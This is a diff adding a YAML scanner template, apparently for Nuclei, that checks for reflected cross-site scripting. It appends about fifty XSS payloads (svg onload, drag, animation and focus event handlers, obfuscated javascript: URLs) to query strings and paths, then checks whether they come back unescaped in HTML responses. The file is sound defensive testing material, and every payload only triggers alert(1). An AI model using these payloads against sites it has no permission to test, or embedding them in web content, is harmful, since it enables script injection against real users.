@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<track id=x tabindex=1 onbeforeactivate=alert(1)></track><input autofocus>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>"
+        - "<frameset draggable=\"true\" ondragstart=\"alert(1)\">test</frameset>"
+        - "<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>"
+        - "<;INPUT TYPE=\";IMAGE\"; SRC=\"jav&#x09;ascript:alert(';XSS';)\">"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+        - "<marquee onmousemove=\"alert(1)\">test</marquee>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<svg/onload=alert(1)>"
+        - "<style>@keyframes slidein {}</style><noscript style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></noscript>"
+        - "<a href=\"javas\\x0Ccript:alert(1)\" id=\"fuzzelement1\">test</a>"
+        - "<time draggable=\"true\" ondragleave=\"alert(1)\">test</time>"
+        - "<iframe onload=\"javascript:javascript:alert(1);\">"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>"
+        - "<aside draggable=\"true\" ondragleave=\"alert(1)\">test</aside>"
+        - "<form autocomplete=off><input type=image src=\"jav&#x09;ascript:alert(1)\"></form>"
+        - "<legend onmouseover=\"alert(1)\">test</legend>"
+        - "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>"
+        - "<style>@keyframes x{}</style><output style=\"animation-name:x\" onanimationend=\"alert(1)\"></output>"
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "<legend draggable=\"true\" ondragleave=\"alert(1)\">test</legend>"
+        - "<svg><noscript onload=alert(1)>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<col onmousemove=\"alert(1)\">test</col>"
+        - "<IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input autofocus>"
+        - "<blink onload=javascript:alert(1)></blink>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del><input autofocus>"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+        - "<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript>"
+        - "<style>@keyframes slidein {}</style><progress style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></progress>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></menu>"
+        - "<style>@keyframes slidein {}</style><li style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></li>"
+        - "<style>:target {color:red;}</style><fieldset id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></fieldset>"
+        - "<svg/onload=alert(1)//"
+        - "<svg><script>alert('XSS')</script>"
+        - "<body background=\"javascript:alert(1)\"></body>"
+        - "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noscript>"
+        - "<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>"
+        - "<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>"
+        - "<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>"
+        - "<SCRIPT>alert(1)</script>"
+        - "<form onblur=alert(1) autofocus><input autofocus>"
+        - "<svg/onload=alert(1)</svg>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext>"
+        - "<SCRIPT>alert(\"XSS\")</SCRIPT>"
+        - "<input autofocus>"
+        - "<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
